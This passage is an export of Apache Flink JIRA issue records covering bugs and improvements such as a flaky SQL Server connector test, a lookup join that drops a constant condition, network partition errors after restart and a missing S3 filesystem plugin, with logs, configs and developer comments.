<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,srichter,srichter,srichter,13/Jun/23 12:16,05/Jul/23 16:08,04/Jun/24 20:41,27/Jun/23 13:19,,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / State Backends,,,,0,pull-request-available,,,We should disable WAL by default in RocksDBWriteBatchWrapper for the case that now WriteOption is provided. This is the case in all restore operations and can impact the performance.,,,,,,,,,,,,,,,,,,FLINK-29577,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-06-13 12:16:38.0,,,,,,,,,,"0|z1iilk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
SqlServerDynamicTableSourceITCase is flaky,FLINK-32325,13539817,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Critical,Fixed,martijnvisser,martijnvisser,martijnvisser,13/Jun/23 09:40,15/Jun/23 11:37,04/Jun/24 20:41,15/Jun/23 09:03,jdbc-3.1.1,jdbc-3.2.0,,,,,,,,,,,,,jdbc-3.1.1,,,,,,Connectors / JDBC,,,,0,pull-request-available,,,"{code:java}
[INFO] Running org.apache.flink.connector.jdbc.databases.sqlserver.table.SqlServerDynamicTableSourceITCase
[INFO] Tests run: 2, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 12.533 s - in org.apache.flink.connector.jdbc.JdbcITCase
[INFO] Running org.apache.flink.connector.jdbc.databases.sqlserver.table.SqlServerTableSourceITCase
Jun 13, 2023 8:49:50 AM com.microsoft.sqlserver.jdbc.SQLServerConnection Prelogin
WARNING: ConnectionID:1 ClientConnectionId: 39249b3b-40c2-4f71-9598-20abe5e93d2d Prelogin error: host localhost port 32783 Unexpected end of prelogin response after 0 bytes read
Jun 13, 2023 8:49:50 AM com.microsoft.sqlserver.jdbc.SQLServerConnection Prelogin
WARNING: ConnectionID:1 ClientConnectionId: 2c0e4870-7284-4022-b97d-7f441fc834dd Prelogin error: host localhost port 32783 Unexpected end of prelogin response after 0 bytes read
Jun 13, 2023 8:49:50 AM com.microsoft.sqlserver.jdbc.SQLServerConnection Prelogin
WARNING: ConnectionID:1 ClientConnectionId: 34e9eff4-445c-477e-8975-d23180897ff8 Prelogin error: host localhost port 32783 Unexpected end of prelogin response after 0 bytes read
Jun 13, 2023 8:49:50 AM com.microsoft.sqlserver.jdbc.SQLServerConnection Prelogin
WARNING: ConnectionID:1 ClientConnectionId: 0d4fe549-66e7-4354-b7c5-ed7ee66527d2 Prelogin error: host localhost port 32783 Unexpected end of prelogin response after 0 bytes read
Jun 13, 2023 8:49:51 AM com.microsoft.sqlserver.jdbc.SQLServerConnection Prelogin
WARNING: ConnectionID:1 ClientConnectionId: 4e98d176-2f1f-4dec-af3e-798ecb536c39 Prelogin error: host localhost port 32783 Unexpected end of prelogin response after 0 bytes read
Jun 13, 2023 8:49:52 AM com.microsoft.sqlserver.jdbc.SQLServerConnection Prelogin
WARNING: ConnectionID:1 ClientConnectionId: 32ba6716-772b-42f3-b27c-9ec1593adcd7 Prelogin error: host localhost port 32783 Error reading prelogin response: Connection reset ClientConnectionId:32ba6716-772b-42f3-b27c-9ec1593adcd7
Jun 13, 2023 8:49:53 AM com.microsoft.sqlserver.jdbc.SQLServerConnection Prelogin
WARNING: ConnectionID:1 ClientConnectionId: fe5e363f-fade-48b8-beb1-9f2e3a524282 Prelogin error: host localhost port 32783 Unexpected end of prelogin response after 0 bytes read
Jun 13, 2023 8:49:54 AM com.microsoft.sqlserver.jdbc.SQLServerConnection Prelogin
WARNING: ConnectionID:1 ClientConnectionId: b454a476-5f05-4cd7-bb43-f62e1f7e030e Prelogin error: host localhost port 32783 Unexpected end of prelogin response after 0 bytes read
Jun 13, 2023 8:49:55 AM com.microsoft.sqlserver.jdbc.SQLServerConnection Prelogin
WARNING: ConnectionID:1 ClientConnectionId: 50282ce3-1fdc-4fa5-8467-4cd4867a8395 Prelogin error: host localhost port 32783 Unexpected end of prelogin response after 0 bytes read
Jun 13, 2023 8:49:56 AM com.microsoft.sqlserver.jdbc.SQLServerConnection Prelogin
WARNING: ConnectionID:1 ClientConnectionId: 837d01bc-7b0c-4532-88d2-1d91671d74f3 Prelogin error: host localhost port 32783 Error reading prelogin response: Connection reset ClientConnectionId:837d01bc-7b0c-4532-88d2-1d91671d74f3
Jun 13, 2023 8:49:57 AM com.microsoft.sqlserver.jdbc.SQLServerConnection Prelogin
WARNING: ConnectionID:1 ClientConnectionId: 43ed7181-5b5d-46e3-b7d2-f3cd2decb043 Prelogin error: host localhost port 32783 Error reading prelogin response: Connection reset ClientConnectionId:43ed7181-5b5d-46e3-b7d2-f3cd2decb043
Jun 13, 2023 8:49:58 AM com.microsoft.sqlserver.jdbc.SQLServerConnection Prelogin
WARNING: ConnectionID:1 ClientConnectionId: f5a54844-ef86-4675-9b39-ede75733686b Prelogin error: host localhost port 32783 Error reading prelogin response: Connection reset ClientConnectionId:f5a54844-ef86-4675-9b39-ede75733686b
Jun 13, 2023 8:49:59 AM com.microsoft.sqlserver.jdbc.SQLServerConnection Prelogin
WARNING: ConnectionID:1 ClientConnectionId: 82da197b-0c48-4cb1-9a0b-e5dbfa27c616 Prelogin error: host localhost port 32783 Error reading prelogin response: Connection reset ClientConnectionId:82da197b-0c48-4cb1-9a0b-e5dbfa27c616
Jun 13, 2023 8:50:00 AM com.microsoft.sqlserver.jdbc.SQLServerConnection Prelogin
WARNING: ConnectionID:1 ClientConnectionId: df9a8372-08cb-4686-85de-2a5ca5aabe52 Prelogin error: host localhost port 32783 Error reading prelogin response: Connection reset ClientConnectionId:df9a8372-08cb-4686-85de-2a5ca5aabe52
{code}

https://github.com/apache/flink-connector-jdbc/actions/runs/5253247136/jobs/9490321045#step:13:322",,,,,,,,,,,,,,,,,,,,,FLINK-32342,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-06-13 09:40:59.0,,,,,,,,,,"0|z1iif4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement watermark alignment on KDS source,FLINK-32324,13539806,13404461,Sub-task,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,liangtl,liangtl,13/Jun/23 08:04,02/Feb/24 10:12,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Connectors / Kinesis,,,,0,,,,Implement watermark alignment interfaces suggested by this FLIP in the KDS Source. https://cwiki.apache.org/confluence/display/FLINK/FLIP-182%3A+Support+watermark+alignment+of+FLIP-27+Sources,,,,,,,,,,FLINK-34339,,FLINK-31989,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-06-13 08:04:34.0,,,,,,,,,,"0|z1iico:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Flink Testing doc missing key information about dependency,FLINK-32323,13539800,,Improvement,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,qingwei91,qingwei91,13/Jun/23 07:49,13/Jun/23 11:10,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Documentation,,,,0,,,,"On this doc: [https://nightlies.apache.org/flink/flink-docs-master/docs/dev/datastream/testing/]

 

It links to this doc [https://nightlies.apache.org/flink/flink-docs-master/docs/dev/configuration/testing/] for project configuration. But it does not mention to use the TestHarness from Flink, we also need to add the following dependency:

 
{noformat}
<dependency>
    <groupId>org.apache.flink</groupId>
    <artifactId>flink-streaming-java</artifactId>
    <version>${flink.version}</version>
    <type>test-jar</type>
    <scope>test</scope>
</dependency>{noformat}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jun 13 11:10:52 UTC 2023,,,,,,,,,,"0|z1iibc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"13/Jun/23 08:41;martijnvisser;[~qingwei91] If you are building a DataStream API application (even without tests), you always need to include flink-streaming-java. So I don't think this is missing;;;","13/Jun/23 09:22;qingwei91;Hi [~martijnvisser] , I believe we need the `<type>test-jar</type>` to explicitly pull the test jar.

 

In my project, without the test-jar config, maven wont pull the TestHarness code.

 

Am I missing something here?;;;","13/Jun/23 09:54;martijnvisser;[~qingwei91] You normally would set {{flink-streaming-java}} with a scope to {{provided}}. So you would end up with something like:

<dependency>
    <groupId>org.apache.flink</groupId>
    <artifactId>flink-streaming-java</artifactId>
    <version>${flink.version}</version>
    <scope>provided</scope>
</dependency>

<dependency>
    <groupId>org.apache.flink</groupId>
    <artifactId>flink-test-utils</artifactId>
    <version>${flink.version}</version>    
    <scope>test</scope>
</dependency>

This should be sufficient;;;","13/Jun/23 11:10;qingwei91;Hi [~martijnvisser] , but without the `<type>test-jar</type>` in your depenency, one cannot use the TestHarness, because they live in the test package in code here: [https://github.com/apache/flink/blob/4a742c86a917af432c0a6ec433acf18c176faf1f/flink-streaming-java/src/test/java/org/apache/flink/streaming/util/KeyedTwoInputStreamOperatorTestHarness.java#L34]

 

 ;;;",,,,,,,,,,,,,,,,,,,
Flink CI mirror service on Azure stops responding to commits to master,FLINK-32322,13539788,,Bug,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Blocker,Fixed,jingge,Sergey Nuyanzin,Sergey Nuyanzin,13/Jun/23 06:52,13/Jun/23 12:33,04/Jun/24 20:41,13/Jun/23 12:33,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Build System / Azure Pipelines,,,,0,,,,Last time it ran it was on Saturday(11.06.2023),,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jun 13 12:32:45 UTC 2023,,,,,,,,,,"0|z1ii8o:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"13/Jun/23 12:32;jingge;The disk was full and has been cleaned up.;;;",,,,,,,,,,,,,,,,,,,,,,
Temporal Join job missing condition after “ON”,FLINK-32321,13539773,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,,macdoor615,macdoor615,13/Jun/23 03:36,26/Oct/23 05:15,04/Jun/24 20:41,26/Oct/23 05:15,1.17.1,1.18.0,,,,,,,,,,,,,,,,,,,Table SQL / Gateway,,,,0,,,,"We have a SQL job, like this
{code:java}
select ... from prod_kafka.f_alarm_tag_dev
 /*+ OPTIONS('scan.startup.mode' = 'latest-offset') */ as f 
left join mysql_bnpmp.gem_bnpmp.f_a_alarm_filter
 /*+ OPTIONS('lookup.cache.max-rows' = '5000',
 'lookup.cache.ttl' = '30s') */
FOR SYSTEM_TIME AS OF f.proctime ff  on ff.rule_type = 0 and f.ne_ip = ff.ip {code}
We submit to flink 1.17.1 & 1.18 rc2 cluster with sql-gateway. We found job detail missing lookup condition (rule_type=0) 
{code:java}
  +- [1196]:LookupJoin(table=[mysql_bnpmp.gem_bnpmp.f_a_alarm_filter], joinType=[LeftOuterJoin], lookup=[ip=ne_ip], select=[event_id, {code}
We submit same sql to flink 1.17.0 cluster with sql-gateway. There is (rule_type=0) lookup condition
{code:java}
  +- [3]:LookupJoin(table=[mysql_bnpmp.gem_bnpmp.f_a_alarm_filter], joinType=[LeftOuterJoin], lookup=[rule_type=0, ip=ne_ip], where=[(rule_type = 0)], select=[event_id, severity,{code}
 ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Oct 26 05:15:30 UTC 2023,,,,,,,,,,"0|z1ii5c:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"10/Aug/23 08:59;337361684@qq.com;Hi, [~jark] . Could you assign this issue to me ? Thanks!

I think we shouldn't delete the constant lookup pk condition like 'rule_type = 0' while we push the constant condition on pk down to source. It will result in lookup join may without a join condition after push down. Just as the below case shown in streaming mode (Flink-1.18):
{code:java}
util.addTable(""""""
                |CREATE TABLE MyTable (
                |  `a` INT,
                |  `b` STRING,
                |  `c` INT,
                |   PROCTIME()
                |) WITH (
                |  'connector' = 'values'
                |)
                |"""""".stripMargin)

util.addTable(""""""
                |CREATE TABLE LookupTableWithFilterPushDown (
                |  `id` INT,
                |  `name` STRING,
                |  `age` INT,
                |  PRIMARY KEY(age) NOT ENFORCED
                |) WITH (
                |  'connector' = 'values',
                |  'filterable-fields' = 'age'
                |)
                |"""""".stripMargin)
val sql =
  """"""
    | SELECT * FROM MyTable AS T LEFT JOIN LookupTableWithFilterPushDown
    | FOR SYSTEM_TIME AS OF T.proctime D
    | ON D.age = 100
    |"""""".stripMargin
util.verifyExecPlan(sql)

{code}
The physical plan will be :
{code:java}
optimize result: 
Calc(select=[a, b, c, PROCTIME_MATERIALIZE(proctime) AS proctime, rowtime, id, name, age])
+- LookupJoin(table=[default_catalog.default_database.LookupTableWithFilterPushDown], joinType=[LeftOuterJoin], lookup=[], select=[a, b, c, proctime, rowtime, id, name, age])
   +- DataStreamScan(table=[[default_catalog, default_database, MyTable]], fields=[a, b, c, proctime, rowtime]) {code}
I think this will get wrong lookupJoin result while we don't have equal join conditions after filter push down.;;;","26/Oct/23 05:15;macdoor615;I found this issue is caused by jdbc connector, and I raised an other issue https://issues.apache.org/jira/browse/FLINK-33365;;;",,,,,,,,,,,,,,,,,,,,,
Same correlate can not be reused due to the different correlationId,FLINK-32320,13539762,,Improvement,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,aitozi,aitozi,13/Jun/23 02:09,15/Jun/23 12:40,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Table SQL / Planner,,,,0,,,,"As describe in SubplanReuserTest


{code:java}
  @Test
  def testSubplanReuseOnCorrelate(): Unit = {
    util.addFunction(""str_split"", new StringSplit())
    val sqlQuery =
      """"""
        |WITH r AS (SELECT a, b, c, v FROM x, LATERAL TABLE(str_split(c, '-')) AS T(v))
        |SELECT * FROM r r1, r r2 WHERE r1.v = r2.v
      """""".stripMargin
    // TODO the sub-plan of Correlate should be reused,
    // however the digests of Correlates are different
    util.verifyExecPlan(sqlQuery)
  }
{code}

This will produce the plan 


{code:java}
HashJoin(joinType=[InnerJoin], where=[(f0 = f00)], select=[a, b, c, f0, a0, b0, c0, f00], build=[right])
:- Exchange(distribution=[hash[f0]])
:  +- Correlate(invocation=[str_split($cor0.c, _UTF-16LE'-')], correlate=[table(str_split($cor0.c,'-'))], select=[a,b,c,f0], rowType=[RecordType(INTEGER a, BIGINT b, VARCHAR(2147483647) c, VARCHAR(2147483647) f0)], joinType=[INNER])
:     +- LegacyTableSourceScan(table=[[default_catalog, default_database, x, source: [TestTableSource(a, b, c)]]], fields=[a, b, c])
+- Exchange(distribution=[hash[f0]])
   +- Correlate(invocation=[str_split($cor1.c, _UTF-16LE'-')], correlate=[table(str_split($cor1.c,'-'))], select=[a,b,c,f0], rowType=[RecordType(INTEGER a, BIGINT b, VARCHAR(2147483647) c, VARCHAR(2147483647) f0)], joinType=[INNER])
      +- LegacyTableSourceScan(table=[[default_catalog, default_database, x, source: [TestTableSource(a, b, c)]]], fields=[a, b, c])
{code}

The Correlate node can not be reused due to the different correlation id.

",,,,,,,,,,,,,,,,,,,,,,,,,,CALCITE-5784,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jun 13 05:05:34 UTC 2023,,,,,,,,,,"0|z1ii2w:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"13/Jun/23 02:14;aitozi;In production, multi sink job are very common, if the table from UDTF is queried multi times, it will cause the function to be executed multi times(as shown in the plan). This will lead to bad performance. 

After some research, I think it's should be caused by: During sqlToRel process, the table function sqlNode will be `toRel` multi times and leads to different correlationId.
;;;","13/Jun/23 02:53;libenchao;You are correct, this will miss some opportunity of reusing common table expressions, including the {{VIEW}} used multi times.;;;","13/Jun/23 03:07;aitozi;[~libenchao] Thanks for your attention. I just made a quick fix on calcite side when creating a new correlationId. If in the same scope and same identifier, using the same correlationId as before. It works as expected. What do you think of this solution ? ;;;","13/Jun/23 05:05;libenchao;[~aitozi] Then you need to open dedicated Calcite issue, and give clear definition and description of the problem in Calcite side, and move discussion there. Note that in Calcite, clear description of the problem is more important than the way to fix it.;;;",,,,,,,,,,,,,,,,,,,
flink can't the partition of network after restart,FLINK-32319,13539756,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,1026688210,1026688210,12/Jun/23 23:12,30/Aug/23 13:06,04/Jun/24 20:41,,1.17.1,,,,,,,,,,,,,,,,,,,,Runtime / Network,,,,0,,,,"flink can't the partition of network after restart, lead that job can not restoring
 !image-2023-06-13-07-14-48-958.png! ","centos 7.
jdk 8.
flink1.17.1 application mode on yarn 

flink configuration :

```

$internal.application.program-args	sql2
$internal.deployment.config-dir	/data/home/flink/wgcn/flink-1.17.1/conf
$internal.yarn.log-config-file	/data/home/flink/wgcn/flink-1.17.1/conf/log4j.properties
akka.ask.timeout	100s
blob.server.port	15402
classloader.check-leaked-classloader	false
classloader.resolve-order	parent-first
env.java.opts.taskmanager	-XX:+UseG1GC -XX:MaxGCPauseMillis=1000 
execution.attached	true
execution.checkpointing.aligned-checkpoint-timeout	10 min
execution.checkpointing.externalized-checkpoint-retention	RETAIN_ON_CANCELLATION
execution.checkpointing.interval	10 min
execution.checkpointing.min-pause	10 min
execution.savepoint-restore-mode	NO_CLAIM
execution.savepoint.ignore-unclaimed-state	false
execution.shutdown-on-attached-exit	false
execution.target	embedded
high-availability	zookeeper
high-availability.cluster-id	application_1684133071014_7202676
high-availability.storageDir	hdfs://xxxx/user/flink/recovery
high-availability.zookeeper.path.root	/flink
high-availability.zookeeper.quorum	xxxxx
internal.cluster.execution-mode	NORMAL
internal.io.tmpdirs.use-local-default	true
io.tmp.dirs	/data1/nm-local-dir/usercache/flink/appcache/application_1684133071014_7202676,/data2/nm-local-dir/usercache/flink/appcache/application_1684133071014_7202676,/data3/nm-local-dir/usercache/flink/appcache/application_1684133071014_7202676,/data4/nm-local-dir/usercache/flink/appcache/application_1684133071014_7202676,/data5/nm-local-dir/usercache/flink/appcache/application_1684133071014_7202676,/data6/nm-local-dir/usercache/flink/appcache/application_1684133071014_7202676,/data7/nm-local-dir/usercache/flink/appcache/application_1684133071014_7202676,/data8/nm-local-dir/usercache/flink/appcache/application_1684133071014_7202676,/data9/nm-local-dir/usercache/flink/appcache/application_1684133071014_7202676,/data10/nm-local-dir/usercache/flink/appcache/application_1684133071014_7202676,/data11/nm-local-dir/usercache/flink/appcache/application_1684133071014_7202676,/data12/nm-local-dir/usercache/flink/appcache/application_1684133071014_7202676
jobmanager.execution.failover-strategy	region
jobmanager.memory.heap.size	9261023232b
jobmanager.memory.jvm-metaspace.size	268435456b
jobmanager.memory.jvm-overhead.max	1073741824b
jobmanager.memory.jvm-overhead.min	1073741824b
jobmanager.memory.off-heap.size	134217728b
jobmanager.memory.process.size	10240m
jobmanager.rpc.address	xxxx
jobmanager.rpc.port	31332
metrics.reporter.promgateway.deleteOnShutdown	true
metrics.reporter.promgateway.factory.class	org.apache.flink.metrics.prometheus.PrometheusPushGatewayReporterFactory
metrics.reporter.promgateway.hostUrl	xxxx:9091
metrics.reporter.promgateway.interval	60 SECONDS
metrics.reporter.promgateway.jobName	join_phase3_v7
metrics.reporter.promgateway.randomJobNameSuffix	false
parallelism.default	128
pipeline.classpaths	
pipeline.jars	file:/data2/nm-local-dir/usercache/flink/appcache/application_1684133071014_7202676/container_e16_1684133071014_7202676_01_000002/frauddetection-0.1.jar
rest.address	xxxx
rest.bind-address	xxxxx
rest.bind-port	50000-50500
rest.flamegraph.enabled	true
restart-strategy.failure-rate.delay	10 s
restart-strategy.failure-rate.failure-rate-interval	1 min
restart-strategy.failure-rate.max-failures-per-interval	6
restart-strategy.type	exponential-delay
state.backend.type	filesystem
state.checkpoints.dir	hdfs://xxxxxx/user/flink/checkpoints-data/wgcn
state.checkpoints.num-retained	3
taskmanager.memory.managed.fraction	0
taskmanager.memory.network.max	600mb
taskmanager.memory.process.size	10240m
taskmanager.memory.segment-size	128kb
taskmanager.network.memory.buffers-per-channel	8
taskmanager.network.memory.floating-buffers-per-gate	800
taskmanager.numberOfTaskSlots	2
web.port	0
web.tmpdir	/tmp/flink-web-1b87445e-2761-4f16-97a1-8d4fc6fa8534
yarn.application-attempt-failures-validity-interval	60000
yarn.application-attempts	3
yarn.application.name	join_phase3_v7
yarn.heartbeat.container-request-interval	700
```",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"12/Jun/23 23:14;1026688210;image-2023-06-13-07-14-48-958.png;https://issues.apache.org/jira/secure/attachment/13058980/image-2023-06-13-07-14-48-958.png",,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Aug 30 13:06:41 UTC 2023,,,,,,,,,,"0|z1ii1k:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"13/Jun/23 02:08;Wencong Liu;Hi [~1026688210] , maybe you could try this config ""taskmanager.network.request-backoff.max: 20000"" because its default value is 10000.;;;","13/Jun/23 02:32;1026688210;hi~ [~Wencong Liu]  thanks for your response,  I will try the config, I have a question. I just roughly looked at the meaning of this config. Why does this config need to be set so large? Is it related to parallel reading?  We are using version 1.12 of Flink in our production environment, and I have never paid attention to this config before. Is this because some mechanisms were added after version 1.12 ;;;","13/Jun/23 02:56;Wencong Liu;If this exception occurs, it indicates that the upstream vertex initializes its ResultPartition slower than the downstream vertex. This happens when the upstream vertex is short of CPU/Memory resources. We should give the LocalInputChannel more chances to request, so we can increase ""taskmanager.network.request-backoff.max"" to add the backoff from 10s to bigger value. [~1026688210] ;;;","14/Jun/23 23:21;1026688210;Hi~[~Wencong Liu],I Increased taskmanager.network.request-backoff.max from 10000 to 20000 and 30000, this problem keeps occurring,Is this related to the config ""-Dtaskmanager.memory.network.max=600 MB""? I calculated that the network buffer required by the task manager is not very large, so I decreased it. ;;;","18/Jun/23 23:54;1026688210;It work after I increase ""taskmanager.memory.network""，but I'm not sure why this is happening, as the Flink Task was functioning normally when it was initially started. After some time, there is a chance that this issue occurs upon restart, which has not been encountered in Flink 1.12 version,and I have calculatd the number of float buffers, buffer size, and the number of buffers for each channel. 600MB should be enough.Is this issue due to a new mechanism causing usage problems? or is it an unexpected issue?;;;","30/Aug/23 13:06;wangm92;[~1026688210] Under what circumstances will this error recur?;;;",,,,,,,,,,,,,,,,,
[flink-operator] missing s3 plugin in folder plugins,FLINK-32318,13539704,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,Not A Problem,,luismacosta,luismacosta,12/Jun/23 16:48,31/Aug/23 06:31,04/Jun/24 20:41,31/Aug/23 06:31,kubernetes-operator-1.5.0,,,,,,,,,,,,,,,,,,,,Kubernetes Operator,,,,0,,,,"Greetings,

I'm trying to configure [Flink's Kubernetes HA services|https://nightlies.apache.org/flink/flink-docs-release-1.13/docs/deployment/ha/kubernetes_ha/] for flink operator jobs, but got an error regarding s3 plugin: _""Could not find a file system implementation for scheme 's3'. The scheme is directly supported by Flink through the following plugin(s): flink-s3-fs-hadoop, flink-s3-fs-presto""_
{code:java}
2023-06-12 10:05:16,981 INFO  akka.remote.Remoting                                         [] - Starting remoting
2023-06-12 10:05:17,194 INFO  akka.remote.Remoting                                         [] - Remoting started; listening on addresses :[akka.tcp://flink@10.4.125.209:6123]
2023-06-12 10:05:17,377 INFO  org.apache.flink.runtime.rpc.akka.AkkaRpcServiceUtils        [] - Actor system started at akka.tcp://flink@10.4.125.209:6123
2023-06-12 10:05:18,175 INFO  org.apache.flink.runtime.entrypoint.ClusterEntrypoint        [] - Shutting KubernetesApplicationClusterEntrypoint down with application status FAILED. Diagnostics org.apache.flink.util.FlinkException: Could not create the ha services from the instantiated HighAvailabilityServicesFactory org.apache.flink.kubernetes.highavailability.KubernetesHaServicesFactory.
	at org.apache.flink.runtime.highavailability.HighAvailabilityServicesUtils.createCustomHAServices(HighAvailabilityServicesUtils.java:299)
	at org.apache.flink.runtime.highavailability.HighAvailabilityServicesUtils.createCustomHAServices(HighAvailabilityServicesUtils.java:285)
	at org.apache.flink.runtime.highavailability.HighAvailabilityServicesUtils.createHighAvailabilityServices(HighAvailabilityServicesUtils.java:145)
	at org.apache.flink.runtime.entrypoint.ClusterEntrypoint.createHaServices(ClusterEntrypoint.java:439)
	at org.apache.flink.runtime.entrypoint.ClusterEntrypoint.initializeServices(ClusterEntrypoint.java:382)
	at org.apache.flink.runtime.entrypoint.ClusterEntrypoint.runCluster(ClusterEntrypoint.java:282)
	at org.apache.flink.runtime.entrypoint.ClusterEntrypoint.lambda$startCluster$1(ClusterEntrypoint.java:232)
	at org.apache.flink.runtime.security.contexts.NoOpSecurityContext.runSecured(NoOpSecurityContext.java:28)
	at org.apache.flink.runtime.entrypoint.ClusterEntrypoint.startCluster(ClusterEntrypoint.java:229)
	at org.apache.flink.runtime.entrypoint.ClusterEntrypoint.runClusterEntrypoint(ClusterEntrypoint.java:729)
	at org.apache.flink.kubernetes.entrypoint.KubernetesApplicationClusterEntrypoint.main(KubernetesApplicationClusterEntrypoint.java:86)
Caused by: java.io.IOException: Could not create FileSystem for highly available storage path (s3://td-infra-stg-us-east-1-s3-flinkoperator/flink-data/ha/flink-basic-example-xpto)
	at org.apache.flink.runtime.blob.BlobUtils.createFileSystemBlobStore(BlobUtils.java:102)
	at org.apache.flink.runtime.blob.BlobUtils.createBlobStoreFromConfig(BlobUtils.java:86)
	at org.apache.flink.kubernetes.highavailability.KubernetesHaServicesFactory.createHAServices(KubernetesHaServicesFactory.java:41)
	at org.apache.flink.runtime.highavailability.HighAvailabilityServicesUtils.createCustomHAServices(HighAvailabilityServicesUtils.java:296)
	... 10 more Caused by: org.apache.flink.core.fs.UnsupportedFileSystemSchemeException: Could not find a file system implementation for scheme 's3'. The scheme is directly supported by Flink through the following plugin(s): flink-s3-fs-hadoop, flink-s3-fs-presto. Please ensure that each plugin resides within its own subfolder within the plugins directory. See https://nightlies.apache.org/flink/flink-docs-stable/docs/deployment/filesystems/plugins/ for more information. If you want to use a Hadoop file system for that scheme, please add the scheme to the configuration fs.allowed-fallback-filesystems. For a full list of supported file systems, please see https://nightlies.apache.org/flink/flink-docs-stable/ops/filesystems/.
    at org.apache.flink.core.fs.FileSystem.getUnguardedFileSystem(FileSystem.java:515) ~[flink-dist-1.16.2.jar:1.16.2]
    at org.apache.flink.core.fs.FileSystem.get(FileSystem.java:409) ~[flink-dist-1.16.2.jar:1.16.2]
    at org.apache.flink.core.fs.Path.getFileSystem(Path.java:274) ~[flink-dist-1.16.2.jar:1.16.2]
    at org.apache.flink.runtime.blob.BlobUtils.createFileSystemBlobStore(BlobUtils.java:99) ~[flink-dist-1.16.2.jar:1.16.2]
    at org.apache.flink.runtime.blob.BlobUtils.createBlobStoreFromConfig(BlobUtils.java:86) ~[flink-dist-1.16.2.jar:1.16.2]
    at org.apache.flink.kubernetes.highavailability.KubernetesHaServicesFactory.createHAServices(KubernetesHaServicesFactory.java:41) ~[flink-dist-1.16.2.jar:1.16.2]
    at org.apache.flink.runtime.highavailability.HighAvailabilityServicesUtils.createCustomHAServices(HighAvailabilityServicesUtils.java:296) ~[flink-dist-1.16.2.jar:1.16.2]
    at org.apache.flink.runtime.highavailability.HighAvailabilityServicesUtils.createCustomHAServices(HighAvailabilityServicesUtils.java:285) ~[flink-dist-1.16.2.jar:1.16.2]
    at org.apache.flink.runtime.highavailability.HighAvailabilityServicesUtils.createHighAvailabilityServices(HighAvailabilityServicesUtils.java:145) ~[flink-dist-1.16.2.jar:1.16.2]
    at org.apache.flink.runtime.entrypoint.ClusterEntrypoint.createHaServices(ClusterEntrypoint.java:439) ~[flink-dist-1.16.2.jar:1.16.2]
    at org.apache.flink.runtime.entrypoint.ClusterEntrypoint.initializeServices(ClusterEntrypoint.java:382) ~[flink-dist-1.16.2.jar:1.16.2]
